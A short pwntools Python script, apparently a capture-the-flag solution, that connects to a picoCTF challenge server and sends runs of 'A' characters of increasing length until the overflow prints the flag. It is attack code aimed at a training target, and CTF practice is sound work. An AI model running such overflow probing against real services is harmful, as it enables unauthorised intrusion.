from pwn import *

for i in range(17,30):
    r = remote('saturn.picoctf.net', 62566)
    r.recvuntil('Enter a string: ')
    r.sendline(b'A'*i)
    output = r.recvall().decode()
    if 'picoCTF' in output:
        print(output)
        break